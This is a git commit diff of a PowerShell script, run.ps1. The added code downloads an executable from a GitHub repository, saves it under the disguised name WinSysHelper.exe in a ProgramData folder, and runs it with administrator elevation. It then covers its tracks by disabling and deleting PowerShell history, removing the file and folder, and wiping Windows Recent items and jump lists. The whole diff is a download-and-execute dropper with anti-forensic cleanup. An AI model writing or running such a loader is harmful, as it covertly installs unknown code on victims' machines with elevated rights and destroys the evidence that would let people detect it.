fd778f03a49e612079605dcb1e1ff16392a16476
silentaimv1-png <silentaimv1@gmail.com>
2026-05-15 22:40:00 +0700

    run.ps1

--- run.ps1
+++ run.ps1
@@ -1,17 +1,28 @@
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
 $ProgressPreference = 'SilentlyContinue'
-$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
-$output = "$env:TEMP\BASX.exe"
+$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
+$folder = "C:\ProgramData\WindowsTask"
+$output = "$folder\WinSysHelper.exe"
+
+if (-not (Test-Path $folder)) { New-Item -Path $folder -ItemType Directory | Out-Null }
 
 Invoke-WebRequest -Uri $url -OutFile $output
-
 $process = Start-Process -FilePath $output -Verb RunAs -PassThru
 $process | Wait-Process
 
 Start-Sleep -Seconds 2
 
-while (Test-Path $output) {
+if (Test-Path $output) {
     Remove-Item -Path $output -Force -ErrorAction SilentlyContinue
-    if (Test-Path $output) { Start-Sleep -Seconds 1 }
+    Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
 }
+
+$recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
+Remove-Item -Path "$recentPath\WinSysHelper*" -Force -ErrorAction SilentlyContinue
+$jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
+Get-ChildItem -Path $jumpListPath | Remove-Item -Force -ErrorAction SilentlyContinue
+
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 exit
